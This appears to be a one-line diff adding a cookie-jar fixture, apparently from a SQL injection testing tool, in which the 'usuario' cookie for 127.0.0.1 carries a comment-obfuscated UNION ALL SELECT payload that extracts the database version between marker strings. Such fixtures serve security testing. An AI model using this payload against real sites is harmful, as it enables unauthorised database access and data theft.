@@ -1,0 +1,1 @@
+127.0.0.1	FALSE	/	FALSE	1506356895	usuario	'/**/union/**/all/**/select/**/group_concat("-X.25.X-",VERSION(),"-X.26.X-"),2#  or ''
